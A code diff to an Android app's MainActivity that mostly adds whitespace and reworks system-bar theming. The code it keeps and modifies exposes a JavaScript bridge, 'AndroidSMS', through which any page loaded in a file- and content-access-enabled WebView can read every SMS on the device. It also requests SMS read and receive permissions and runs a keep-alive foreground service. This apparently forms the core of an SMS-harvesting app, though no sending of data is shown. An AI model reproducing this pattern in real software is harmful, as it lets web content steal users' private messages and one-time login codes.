@@ -11,16 +11,17 @@ import android.database.Cursor;
 import android.os.Build;
 import android.os.Bundle;
 import android.view.Window;
+import android.view.WindowInsetsController;
 import android.webkit.JavascriptInterface;
 import android.webkit.WebSettings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
 
+
 import org.json.JSONArray;
 import org.json.JSONObject;
 
 
-import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
@@ -34,6 +35,7 @@ public class MainActivity extends AppCompatActivity {
 
 
     private static final int SMS_PERMISSION = 200;
+
 
 
 
@@ -61,19 +63,27 @@ public class MainActivity extends AppCompatActivity {
 
 
 
+
         WebSettings settings =
                 webView.getSettings();
+
 
 
         settings.setJavaScriptEnabled(true);
         settings.setDomStorageEnabled(true);
         settings.setAllowFileAccess(true);
+        settings.setAllowContentAccess(true);
+        settings.setLoadWithOverviewMode(true);
+        settings.setUseWideViewPort(true);
 
 
 
         webView.addJavascriptInterface(
+
                 new SmsBridge(),
+
                 "AndroidSMS"
+
         );
 
 
@@ -100,7 +110,10 @@ public class MainActivity extends AppCompatActivity {
 
 
 
+
+
     private void startKeepAlive(){
+
 
 
         Intent i =
@@ -110,17 +123,27 @@ public class MainActivity extends AppCompatActivity {
                 );
 
 
-        if(Build.VERSION.SDK_INT >= 26){
+
+        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O){
+
 
             startForegroundService(i);
 
+
+
         }else{
+
 
             startService(i);
 
+
         }
 
+
     }
+
+
+
 
 
 
@@ -132,9 +155,13 @@ public class MainActivity extends AppCompatActivity {
     private void requestSms(){
 
 
+
         if(ContextCompat.checkSelfPermission(
+
                 this,
+
                 Manifest.permission.READ_SMS
+
         )
         != PackageManager.PERMISSION_GRANTED){
 
@@ -145,17 +172,24 @@ public class MainActivity extends AppCompatActivity {
                     this,
 
                     new String[]{
+
                             Manifest.permission.READ_SMS,
                             Manifest.permission.RECEIVE_SMS
+
                     },
 
                     SMS_PERMISSION
 
             );
 
+
         }
 
+
     }
+
+
+
 
 
 
@@ -168,8 +202,10 @@ public class MainActivity extends AppCompatActivity {
     public class SmsBridge {
 
 
+
         @JavascriptInterface
         public String getAllSms(){
+
 
 
             JSONArray array =
@@ -177,70 +213,93 @@ public class MainActivity extends AppCompatActivity {
 
 
 
-            Cursor c =
-                    getContentResolver()
-                    .query(
 
-                            Uri.parse(
-                            "content://sms/"
-                            ),
-
-                            null,
-                            null,
-                            null,
-                            "date DESC"
-
-                    );
+            try{
 
 
 
-            if(c != null){
+                Cursor c =
+                        getContentResolver()
+                        .query(
+
+                                Uri.parse(
+                                "content://sms/"
+                                ),
+
+                                null,
+                                null,
+                                null,
+                                "date DESC"
+
+                        );
 
 
-                while(c.moveToNext()){
 
 
-                    try{
+                if(c != null){
+
+
+
+                    while(c.moveToNext()){
+
 
 
                         JSONObject sms =
                                 new JSONObject();
 
 
+
                         sms.put(
                                 "sender",
                                 c.getString(
-                                c.getColumnIndex("address"))
+                                c.getColumnIndexOrThrow(
+                                "address"))
                         );
+
 
 
                         sms.put(
                                 "message",
                                 c.getString(
-                                c.getColumnIndex("body"))
+                                c.getColumnIndexOrThrow(
+                                "body"))
                         );
+
 
 
                         sms.put(
                                 "date",
                                 c.getString(
-                                c.getColumnIndex("date"))
+                                c.getColumnIndexOrThrow(
+                                "date"))
                         );
+
 
 
                         array.put(sms);
 
 
-                    }catch(Exception e){}
+                    }
+
+
+
+
+                    c.close();
 
 
                 }
 
 
 
-                c.close();
+            }catch(Exception e){
+
+
+                e.printStackTrace();
+
 
             }
+
+
 
 
 
@@ -259,33 +318,162 @@ public class MainActivity extends AppCompatActivity {
 
 
 
+
+
+
+
+
     private void setupSystemTheme(){
 
 
+
         boolean dark =
+
+
         (getResources()
         .getConfiguration()
         .uiMode
         &
         Configuration.UI_MODE_NIGHT_MASK)
+
         ==
+
         Configuration.UI_MODE_NIGHT_YES;
 
 
 
-        Window w =
+
+
+        Window window =
                 getWindow();
 
 
 
-        w.setStatusBarColor(
-                dark
-                ?
-                Color.DKGRAY
-                :
-                Color.WHITE
-        );
+
+
+        int color;
+
+
+
+        if(dark){
+
+
+            color =
+            Color.parseColor("#121212");
+
+
+
+        }else{
+
+
+            color =
+            Color.WHITE;
+
+
+        }
+
+
+
+
+
+
+        // status bar
+
+        window.setStatusBarColor(color);
+
+
+
+        // navigation bar
+
+        window.setNavigationBarColor(color);
+
+
+
+
+
+
+
+
+        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.R){
+
+
+
+            WindowInsetsController controller =
+                    window.getInsetsController();
+
+
+
+            if(controller != null){
+
+
+
+                if(dark){
+
+
+
+                    controller.setSystemBarsAppearance(
+
+                            0,
+
+                            WindowInsetsController
+                            .APPEARANCE_LIGHT_STATUS_BARS |
+
+                            WindowInsetsController
+                            .APPEARANCE_LIGHT_NAVIGATION_BARS
+
+                    );
+
+
+
+                }else{
+
+
+
+                    controller.setSystemBarsAppearance(
+
+                            WindowInsetsController
+                            .APPEARANCE_LIGHT_STATUS_BARS |
+
+                            WindowInsetsController
+                            .APPEARANCE_LIGHT_NAVIGATION_BARS,
+
+
+                            WindowInsetsController
+                            .APPEARANCE_LIGHT_STATUS_BARS |
+
+                            WindowInsetsController
+                            .APPEARANCE_LIGHT_NAVIGATION_BARS
+
+                    );
+
+
+                }
+
+
+            }
+
+
+        }
+
 
     }
+
+
+
+
+
+    @Override
+    public void onConfigurationChanged(
+            Configuration config
+    ){
+
+        super.onConfigurationChanged(config);
+
+
+        setupSystemTheme();
+
+    }
+
+
 
 }
